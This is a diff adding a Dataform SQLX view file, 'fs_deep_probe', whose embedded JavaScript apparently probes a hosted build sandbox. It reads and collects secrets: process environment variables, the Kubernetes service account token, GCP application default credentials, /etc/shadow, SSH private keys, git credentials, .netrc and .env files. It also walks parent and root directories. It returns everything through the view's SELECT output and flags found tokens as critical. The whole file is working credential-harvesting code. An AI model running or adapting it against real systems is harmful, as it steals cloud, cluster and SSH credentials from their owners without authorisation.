@@ -1,0 +1,314 @@
+config { type: "view", name: "fs_deep_probe" }
+
+js {
+  let results = {
+    probeTime: new Date().toISOString(),
+    purpose: "Deep file system access probe - secrets, proc, k8s tokens"
+  };
+
+  // Helper to safely read file
+  function tryReadFile(path, maxLen = 1000) {
+    try {
+      const fs = require('fs');
+      const content = fs.readFileSync(path, 'utf8');
+      return {
+        success: true,
+        content: content.substring(0, maxLen),
+        fullLength: content.length
+      };
+    } catch(e) {
+      return { success: false, error: e.message.substring(0, 100) };
+    }
+  }
+
+  // Helper to check if path exists
+  function pathExists(path) {
+    try {
+      const fs = require('fs');
+      fs.accessSync(path);
+      return true;
+    } catch(e) {
+      return false;
+    }
+  }
+
+  // Helper to list directory
+  function tryListDir(path) {
+    try {
+      const fs = require('fs');
+      const entries = fs.readdirSync(path);
+      return { success: true, entries: entries.slice(0, 50) };
+    } catch(e) {
+      return { success: false, error: e.message.substring(0, 100) };
+    }
+  }
+
+  // =============================================================================
+  // TEST 1: /proc/self - Process Information
+  // =============================================================================
+  results.test1_procSelf = {};
+  try {
+    const procPaths = {
+      environ: tryReadFile('/proc/self/environ', 4000),
+      cmdline: tryReadFile('/proc/self/cmdline', 500),
+      cwd: tryReadFile('/proc/self/cwd', 500),  // symlink
+      exe: tryReadFile('/proc/self/exe', 500),  // symlink
+      status: tryReadFile('/proc/self/status', 1000),
+      maps: tryReadFile('/proc/self/maps', 2000),
+      mountinfo: tryReadFile('/proc/self/mountinfo', 2000)
+    };
+
+    // Parse environ if available
+    let parsedEnv = {};
+    if (procPaths.environ.success) {
+      const envPairs = procPaths.environ.content.split('\0');
+      for (const pair of envPairs) {
+        const idx = pair.indexOf('=');
+        if (idx > 0) {
+          const key = pair.substring(0, idx);
+          const val = pair.substring(idx + 1);
+          parsedEnv[key] = val.substring(0, 100);
+        }
+      }
+    }
+
+    results.test1_procSelf = {
+      status: "completed",
+      procPaths,
+      parsedEnvFromProc: parsedEnv,
+      parsedEnvCount: Object.keys(parsedEnv).length
+    };
+  } catch(e) {
+    results.test1_procSelf = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 2: Kubernetes Service Account Token
+  // =============================================================================
+  results.test2_k8sToken = {};
+  try {
+    const k8sPaths = {
+      token: tryReadFile('/var/run/secrets/kubernetes.io/serviceaccount/token', 2000),
+      namespace: tryReadFile('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 100),
+      caCert: tryReadFile('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt', 500)
+    };
+
+    // Check for mounted secrets
+    const secretsDir = tryListDir('/var/run/secrets');
+
+    results.test2_k8sToken = {
+      status: "completed",
+      k8sPaths,
+      secretsDir,
+      tokenFound: k8sPaths.token.success,
+      tokenPreview: k8sPaths.token.success ?
+        k8sPaths.token.content.substring(0, 50) + "..." : null
+    };
+  } catch(e) {
+    results.test2_k8sToken = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 3: GCP Credential Files
+  // =============================================================================
+  results.test3_gcpCreds = {};
+  try {
+    const env = typeof process !== 'undefined' ? process.env : {};
+    const home = env.HOME || '/root';
+
+    const credPaths = {
+      // Application Default Credentials
+      adcDefault: tryReadFile(home + '/.config/gcloud/application_default_credentials.json', 2000),
+      adcRoot: tryReadFile('/root/.config/gcloud/application_default_credentials.json', 2000),
+
+      // Service account key if specified
+      specifiedCreds: env.GOOGLE_APPLICATION_CREDENTIALS ?
+        tryReadFile(env.GOOGLE_APPLICATION_CREDENTIALS, 2000) : { skipped: true },
+
+      // GCloud config
+      gcloudConfig: tryReadFile(home + '/.config/gcloud/configurations/config_default', 500),
+
+      // Other common locations
+      metadataToken: tryReadFile('/var/run/secrets/google.com/token', 500)
+    };
+
+    // Check gcloud directory structure
+    const gcloudDir = tryListDir(home + '/.config/gcloud');
+
+    results.test3_gcpCreds = {
+      status: "completed",
+      credPaths,
+      gcloudDir,
+      adcFound: credPaths.adcDefault.success || credPaths.adcRoot.success
+    };
+  } catch(e) {
+    results.test3_gcpCreds = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 4: System Files
+  // =============================================================================
+  results.test4_systemFiles = {};
+  try {
+    const systemPaths = {
+      passwd: tryReadFile('/etc/passwd', 2000),
+      hosts: tryReadFile('/etc/hosts', 500),
+      resolv: tryReadFile('/etc/resolv.conf', 500),
+      hostname: tryReadFile('/etc/hostname', 100),
+      osRelease: tryReadFile('/etc/os-release', 500),
+      shadow: tryReadFile('/etc/shadow', 500),  // Usually not readable
+      sudoers: tryReadFile('/etc/sudoers', 500)  // Usually not readable
+    };
+
+    results.test4_systemFiles = {
+      status: "completed",
+      systemPaths,
+      shadowReadable: systemPaths.shadow.success,
+      sudoersReadable: systemPaths.sudoers.success
+    };
+  } catch(e) {
+    results.test4_systemFiles = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 5: Current Directory and Package Info
+  // =============================================================================
+  results.test5_currentDir = {};
+  try {
+    const cwd = process.cwd ? process.cwd() : '.';
+
+    const cwdInfo = {
+      cwd,
+      cwdContents: tryListDir(cwd),
+      packageJson: tryReadFile(cwd + '/package.json', 2000),
+      dataformJson: tryReadFile(cwd + '/dataform.json', 1000),
+      nodeModules: tryListDir(cwd + '/node_modules'),
+      dotEnv: tryReadFile(cwd + '/.env', 1000),
+      dotEnvLocal: tryReadFile(cwd + '/.env.local', 1000)
+    };
+
+    results.test5_currentDir = {
+      status: "completed",
+      ...cwdInfo
+    };
+  } catch(e) {
+    results.test5_currentDir = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 6: SSH and Git Credentials
+  // =============================================================================
+  results.test6_sshGit = {};
+  try {
+    const env = typeof process !== 'undefined' ? process.env : {};
+    const home = env.HOME || '/root';
+
+    const sshGitPaths = {
+      sshDir: tryListDir(home + '/.ssh'),
+      sshPrivateKey: tryReadFile(home + '/.ssh/id_rsa', 500),
+      sshConfig: tryReadFile(home + '/.ssh/config', 500),
+      gitConfig: tryReadFile(home + '/.gitconfig', 500),
+      gitCredentials: tryReadFile(home + '/.git-credentials', 500),
+      netrc: tryReadFile(home + '/.netrc', 500)
+    };
+
+    results.test6_sshGit = {
+      status: "completed",
+      sshGitPaths,
+      sshKeysFound: sshGitPaths.sshDir.success ?
+        sshGitPaths.sshDir.entries.filter(e => e.startsWith('id_')) : []
+    };
+  } catch(e) {
+    results.test6_sshGit = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 7: Container Metadata
+  // =============================================================================
+  results.test7_containerMeta = {};
+  try {
+    const containerPaths = {
+      dockerEnv: tryReadFile('/.dockerenv', 100),
+      cgroup: tryReadFile('/proc/self/cgroup', 1000),
+      containerEnv: tryReadFile('/run/.containerenv', 500),
+      machineId: tryReadFile('/etc/machine-id', 100)
+    };
+
+    // Parse cgroup for container ID
+    let containerId = null;
+    if (containerPaths.cgroup.success) {
+      const match = containerPaths.cgroup.content.match(/docker\/([a-f0-9]{64})/);
+      if (match) containerId = match[1];
+    }
+
+    results.test7_containerMeta = {
+      status: "completed",
+      containerPaths,
+      containerId,
+      isContainer: containerPaths.dockerEnv.success || containerPaths.containerEnv.success
+    };
+  } catch(e) {
+    results.test7_containerMeta = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 8: Path Traversal Attempts
+  // =============================================================================
+  results.test8_pathTraversal = {};
+  try {
+    const cwd = process.cwd ? process.cwd() : '.';
+
+    const traversalPaths = {
+      upOne: tryListDir(cwd + '/..'),
+      upTwo: tryListDir(cwd + '/../..'),
+      upThree: tryListDir(cwd + '/../../..'),
+      root: tryListDir('/'),
+      tmp: tryListDir('/tmp'),
+      varLog: tryListDir('/var/log'),
+      home: tryListDir('/home')
+    };
+
+    results.test8_pathTraversal = {
+      status: "completed",
+      traversalPaths,
+      rootAccess: traversalPaths.root.success,
+      tmpAccess: traversalPaths.tmp.success
+    };
+  } catch(e) {
+    results.test8_pathTraversal = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // SUMMARY
+  // =============================================================================
+  results.summary = {
+    testsRun: 8,
+    allCompleted: Object.keys(results).filter(k =>
+      k.startsWith("test") && results[k].status === "completed"
+    ).length,
+    criticalFindings: []
+  };
+
+  // Check for critical findings
+  if (results.test2_k8sToken && results.test2_k8sToken.tokenFound) {
+    results.summary.criticalFindings.push("K8S SERVICE ACCOUNT TOKEN FOUND!");
+  }
+
+  if (results.test3_gcpCreds && results.test3_gcpCreds.adcFound) {
+    results.summary.criticalFindings.push("GCP ADC CREDENTIALS FOUND!");
+  }
+
+  if (results.test1_procSelf && results.test1_procSelf.procPaths) {
+    if (results.test1_procSelf.procPaths.environ && results.test1_procSelf.procPaths.environ.success) {
+      results.summary.criticalFindings.push("/proc/self/environ READABLE");
+    }
+  }
+
+  if (results.test6_sshGit && results.test6_sshGit.sshGitPaths) {
+    if (results.test6_sshGit.sshGitPaths.sshPrivateKey && results.test6_sshGit.sshGitPaths.sshPrivateKey.success) {
+      results.summary.criticalFindings.push("SSH PRIVATE KEY READABLE!");
+    }
+  }
+}
+
+SELECT '${JSON.stringify(results, null, 2)}' as fs_deep_probe
